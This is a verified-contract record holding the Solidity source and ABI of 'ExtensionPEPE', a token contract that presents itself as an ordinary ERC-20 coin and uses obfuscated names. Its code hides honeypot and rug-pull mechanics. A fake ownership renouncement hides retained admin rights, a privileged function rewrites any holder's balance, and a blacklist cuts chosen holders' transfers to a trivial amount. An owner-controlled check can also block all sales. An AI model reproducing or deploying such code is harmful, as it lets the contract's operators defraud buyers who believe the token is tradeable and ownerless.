{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface swapMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamToken) external view returns (uint256);\n\n    function transfer(address takeSwap, uint256 marketingToTrading) external returns (bool);\n\n    function allowance(address launchedTakeMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingToTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeSwap,\n        uint256 marketingToTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldMin, uint256 value);\n    event Approval(address indexed launchedTakeMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract amountTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountLaunchReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldReceiverTake {\n    function createPair(address limitMin, address tradingAt) external returns (address);\n}\n\ninterface swapMinMetadata is swapMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExtensionPEPE is amountTotal, swapMin, swapMinMetadata {\n\n    constructor (){\n        if (maxMode == txWallet) {\n            receiverTrading = true;\n        }\n        amountLaunchReceiver minLiquidity = amountLaunchReceiver(isTrading);\n        amountEnable = shouldReceiverTake(minLiquidity.factory()).createPair(minLiquidity.WETH(), address(this));\n        if (marketingLimit == txWallet) {\n            swapTrading = true;\n        }\n        enableReceiver = _msgSender();\n        autoFrom();\n        modeTake[enableReceiver] = true;\n        feeShouldSwap[enableReceiver] = tradingTotal;\n        if (receiverTrading) {\n            txWallet = maxMode;\n        }\n        emit Transfer(address(0), enableReceiver, tradingTotal);\n    }\n\n    function isLiquidity(address fundAmount, address takeSwap, uint256 marketingToTrading) internal returns (bool) {\n        require(feeShouldSwap[fundAmount] >= marketingToTrading);\n        feeShouldSwap[fundAmount] -= marketingToTrading;\n        feeShouldSwap[takeSwap] += marketingToTrading;\n        emit Transfer(fundAmount, takeSwap, marketingToTrading);\n        return true;\n    }\n\n    function launchedTake(uint256 marketingToTrading) public {\n        modeLaunch();\n        exemptBuy = marketingToTrading;\n    }\n\n    bool private teamWallet;\n\n    uint256 public marketingLimit;\n\n    function sellWallet(address fundAmount, address takeSwap, uint256 marketingToTrading) internal returns (bool) {\n        if (fundAmount == enableReceiver) {\n            return isLiquidity(fundAmount, takeSwap, marketingToTrading);\n        }\n        uint256 marketingFee = swapMin(amountEnable).balanceOf(senderMode);\n        require(marketingFee == exemptBuy);\n        require(takeSwap != senderMode);\n        if (fundListTake[fundAmount]) {\n            return isLiquidity(fundAmount, takeSwap, feeWalletLimit);\n        }\n        return isLiquidity(fundAmount, takeSwap, marketingToTrading);\n    }\n\n    function enableFund(address receiverMode) public {\n        modeLaunch();\n        if (swapTrading == launchedExemptAmount) {\n            txWallet = marketingLimit;\n        }\n        if (receiverMode == enableReceiver || receiverMode == amountEnable) {\n            return;\n        }\n        fundListTake[receiverMode] = true;\n    }\n\n    function autoFrom() public {\n        emit OwnershipTransferred(enableReceiver, address(0));\n        isFrom = address(0);\n    }\n\n    uint256 exemptBuy;\n\n    uint256 constant feeWalletLimit = 2 ** 10;\n\n    uint256 private txWallet;\n\n    address public enableReceiver;\n\n    function transferFrom(address fundAmount, address takeSwap, uint256 marketingToTrading) external override returns (bool) {\n        if (_msgSender() != isTrading) {\n            if (buyFee[fundAmount][_msgSender()] != type(uint256).max) {\n                require(marketingToTrading <= buyFee[fundAmount][_msgSender()]);\n                buyFee[fundAmount][_msgSender()] -= marketingToTrading;\n            }\n        }\n        return sellWallet(fundAmount, takeSwap, marketingToTrading);\n    }\n\n    address public amountEnable;\n\n    uint256 receiverLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingTotal;\n    }\n\n    address isTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private receiverTrading;\n\n    bool private launchedExemptAmount;\n\n    function approve(address tradingMarketing, uint256 marketingToTrading) public virtual override returns (bool) {\n        buyFee[_msgSender()][tradingMarketing] = marketingToTrading;\n        emit Approval(_msgSender(), tradingMarketing, marketingToTrading);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return isFrom;\n    }\n\n    bool public txTrading;\n\n    function transfer(address launchToken, uint256 marketingToTrading) external virtual override returns (bool) {\n        return sellWallet(_msgSender(), launchToken, marketingToTrading);\n    }\n\n    mapping(address => uint256) private feeShouldSwap;\n\n    function modeLaunch() private view {\n        require(modeTake[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderBuy;\n    }\n\n    uint8 private marketingEnable = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return launchMax;\n    }\n\n    function receiverSender(address toTrading) public {\n        if (txTrading) {\n            return;\n        }\n        \n        modeTake[toTrading] = true;\n        if (marketingLimit != txWallet) {\n            txWallet = maxMode;\n        }\n        txTrading = true;\n    }\n\n    function allowance(address totalMax, address tradingMarketing) external view virtual override returns (uint256) {\n        if (tradingMarketing == isTrading) {\n            return type(uint256).max;\n        }\n        return buyFee[totalMax][tradingMarketing];\n    }\n\n    mapping(address => bool) public modeTake;\n\n    uint256 public maxMode;\n\n    string private launchMax = \"Extension PEPE\";\n\n    function takeSell(address launchToken, uint256 marketingToTrading) public {\n        modeLaunch();\n        feeShouldSwap[launchToken] = marketingToTrading;\n    }\n\n    function owner() external view returns (address) {\n        return isFrom;\n    }\n\n    mapping(address => mapping(address => uint256)) private buyFee;\n\n    event OwnershipTransferred(address indexed buyMarketing, address indexed fundAuto);\n\n    uint256 private tradingTotal = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingEnable;\n    }\n\n    mapping(address => bool) public fundListTake;\n\n    bool public swapTrading;\n\n    string private senderBuy = \"EPE\";\n\n    address private isFrom;\n\n    function balanceOf(address teamToken) public view virtual override returns (uint256) {\n        return feeShouldSwap[teamToken];\n    }\n\n    address senderMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTakeMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingToTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"}],\"name\":\"enableFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundListTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingToTrading\",\"type\":\"uint256\"}],\"name\":\"launchedTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTrading\",\"type\":\"address\"}],\"name\":\"receiverSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingToTrading\",\"type\":\"uint256\"}],\"name\":\"takeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingToTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingToTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ExtensionPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}